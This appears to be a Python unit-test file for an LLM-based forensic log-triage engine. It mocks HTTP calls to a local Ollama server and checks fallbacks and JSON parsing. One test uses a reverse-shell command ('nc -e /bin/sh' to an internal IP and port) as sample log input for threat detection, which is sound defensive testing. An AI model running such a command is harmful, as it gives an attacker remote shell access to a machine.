"""Unit tests for OllamaForensicEngine — Primary Ollama LLM Triage Engine.

Covers: Task 3.1 from .kiro/specs/blackwall-test-coverage-remediation/tasks.md
Target: src/blackwall/enterprise/forensics/ollama_engine.py — REQ-5.1
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from blackwall.enterprise.forensics.ollama_engine import OllamaForensicEngine


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _build_mock_session(response: MagicMock | None = None, raise_exc: Exception | None = None) -> MagicMock:
    """Build a minimal aiohttp.ClientSession mock.

    If ``raise_exc`` is given, both ``get`` and ``post`` raise it.
    Otherwise both return a context manager yielding ``response``.
    """
    session = MagicMock()
    session.__aenter__ = AsyncMock(return_value=session)
    session.__aexit__ = AsyncMock(return_value=None)

    if raise_exc is not None:
        session.get.side_effect = raise_exc
        session.post.side_effect = raise_exc
    else:
        resp_cm = MagicMock()
        resp_cm.__aenter__ = AsyncMock(return_value=response)
        resp_cm.__aexit__ = AsyncMock(return_value=None)
        session.get.return_value = resp_cm
        session.post.return_value = resp_cm

    return session


# ---------------------------------------------------------------------------
# __init__ tests
# ---------------------------------------------------------------------------


def test_init_with_valid_config() -> None:
    """Test __init__ stores endpoint, model, and timeout correctly."""
    engine = OllamaForensicEngine(
        endpoint="http://10.0.0.5:11434",
        model="glm-4:5b",
        timeout=5.0,
    )
    assert engine.endpoint == "http://10.0.0.5:11434"
    assert engine.model == "glm-4:5b"
    assert engine.timeout == 5.0


def test_init_defaults() -> None:
    """Test __init__ applies expected default values when no args passed."""
    engine = OllamaForensicEngine()
    assert engine.endpoint == "http://localhost:11434"
    assert engine.model == "qwen3:8b"
    assert engine.timeout == 3.0


def test_init_strips_trailing_slash() -> None:
    """Test __init__ strips trailing slash from endpoint."""
    engine = OllamaForensicEngine(endpoint="http://localhost:11434/")
    assert not engine.endpoint.endswith("/")
    assert engine.endpoint == "http://localhost:11434"


# ---------------------------------------------------------------------------
# is_ollama_online tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_is_ollama_online_returns_true_on_http_200() -> None:
    """Mock HTTP GET /api/tags returning 200 → is_ollama_online returns True."""
    engine = OllamaForensicEngine()
    mock_resp = MagicMock()
    mock_resp.status = 200

    session = _build_mock_session(response=mock_resp)
    with patch("aiohttp.ClientSession", return_value=session):
        result = await engine.is_ollama_online()

    assert result is True


@pytest.mark.asyncio
async def test_is_ollama_online_returns_false_on_connection_error() -> None:
    """Mock HTTP GET raising Exception (connection refused) → returns False."""
    engine = OllamaForensicEngine()

    session = _build_mock_session(raise_exc=Exception("Connection refused"))
    with patch("aiohttp.ClientSession", return_value=session):
        result = await engine.is_ollama_online()

    assert result is False


@pytest.mark.asyncio
async def test_is_ollama_online_returns_false_on_non_200_status() -> None:
    """Mock HTTP GET returning 503 → is_ollama_online returns False (only 200 is True)."""
    engine = OllamaForensicEngine()
    mock_resp = MagicMock()
    mock_resp.status = 503

    session = _build_mock_session(response=mock_resp)
    with patch("aiohttp.ClientSession", return_value=session):
        result = await engine.is_ollama_online()

    assert result is False


# ---------------------------------------------------------------------------
# analyze_log_stream tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_analyze_log_stream_returns_structured_json_on_success() -> None:
    """Mock POST /api/generate returning 200 with valid JSON response field."""
    engine = OllamaForensicEngine(model="qwen3:8b")

    ollama_body = {
        "response": (
            '{"is_threat": true, "threat_level": "CRITICAL",'
            ' "description": "Reverse shell attempt detected",'
            ' "extracted_pattern": "nc -e /bin/sh"}'
        )
    }
    mock_resp = MagicMock()
    mock_resp.status = 200
    mock_resp.json = AsyncMock(return_value=ollama_body)

    session = _build_mock_session(response=mock_resp)
    with patch("aiohttp.ClientSession", return_value=session):
        report = await engine.analyze_log_stream(
            {"timestamp": "2026-08-01T00:00:00Z", "command": "nc -e /bin/sh 10.0.0.99 4444"}
        )

    assert report["is_threat"] is True
    assert report["threat_level"] == "CRITICAL"
    assert report["mode"] == "ollama_primary"
    assert report["model"] == "qwen3:8b"
    assert "nc -e /bin/sh" in report["extracted_pattern"]
    assert "description" in report


@pytest.mark.asyncio
async def test_analyze_log_stream_fallback_when_ollama_offline() -> None:
    """When aiohttp raises, analyze_log_stream returns safe fallback dict."""
    engine = OllamaForensicEngine()

    session = _build_mock_session(raise_exc=ConnectionError("Ollama not running"))
    with patch("aiohttp.ClientSession", return_value=session):
        report = await engine.analyze_log_stream({"command": "python3 safe_script.py"})

    assert report["is_threat"] is False
    assert report["threat_level"] == "LOW"
    assert report["mode"] == "ollama_primary"
    assert "unavailable" in report["description"].lower() or report["description"] != ""
    assert report["extracted_pattern"] == ""


@pytest.mark.asyncio
async def test_analyze_log_stream_fallback_on_http_error_status() -> None:
    """When POST returns non-200 status, fallback dict returned."""
    engine = OllamaForensicEngine()
    mock_resp = MagicMock()
    mock_resp.status = 500

    session = _build_mock_session(response=mock_resp)
    with patch("aiohttp.ClientSession", return_value=session):
        report = await engine.analyze_log_stream({"msg": "test"})

    assert report["is_threat"] is False
    assert report["threat_level"] == "LOW"


# ---------------------------------------------------------------------------
# _parse_llm_json_response tests
# ---------------------------------------------------------------------------


def test_parse_llm_json_response_plain_valid_json() -> None:
    """Plain JSON string → all fields parsed and returned."""
    engine = OllamaForensicEngine(model="qwen3:8b")
    raw = (
        '{"is_threat": false, "threat_level": "LOW",'
        ' "description": "No threat", "extracted_pattern": ""}'
    )
    result = engine._parse_llm_json_response(raw)

    assert result["is_threat"] is False
    assert result["threat_level"] == "LOW"
    assert result["description"] == "No threat"
    assert result["mode"] == "ollama_primary"
    assert result["model"] == "qwen3:8b"


def test_parse_llm_json_response_markdown_fenced_json() -> None:
    """JSON wrapped in ```json … ``` markdown fences is stripped before parsing."""
    engine = OllamaForensicEngine(model="glm-4:5b")
    raw = (
        "```json\n"
        '{"is_threat": true, "threat_level": "HIGH",'
        ' "description": "Suspicious exec", "extracted_pattern": "exec"}\n'
        "```"
    )
    result = engine._parse_llm_json_response(raw)

    assert result["is_threat"] is True
    assert result["threat_level"] == "HIGH"
    assert result["model"] == "glm-4:5b"


def test_parse_llm_json_response_completely_malformed() -> None:
    """Completely malformed response → fallback dict with is_threat False."""
    engine = OllamaForensicEngine()
    raw = "Sorry, I cannot analyze this log. Please provide more context."
    result = engine._parse_llm_json_response(raw)

    assert result["is_threat"] is False
    assert result["threat_level"] == "LOW"
    assert result["mode"] == "ollama_primary"
    assert "description" in result


def test_parse_llm_json_response_partial_truncated_with_threat_signal() -> None:
    """Truncated response containing explicit key pattern → regex fallback extracts signal."""
    engine = OllamaForensicEngine()
    # Partial/truncated JSON that still has the is_threat key visible
    raw = '{"is_threat": true, "threat_level": "CRITICAL", "descri'
    result = engine._parse_llm_json_response(raw)

    # Regex fallback: "is_threat": true and "threat_level": "CRITICAL" visible
    assert result["is_threat"] is True
    assert result["threat_level"] == "CRITICAL"
    assert result["mode"] == "ollama_primary"


def test_parse_llm_json_response_partial_truncated_no_threat() -> None:
    """Truncated benign response → fallback with no threat signal."""
    engine = OllamaForensicEngine()
    raw = '{"is_threat": false, "threat_level":'
    result = engine._parse_llm_json_response(raw)

    assert result["is_threat"] is False
    assert result["mode"] == "ollama_primary"
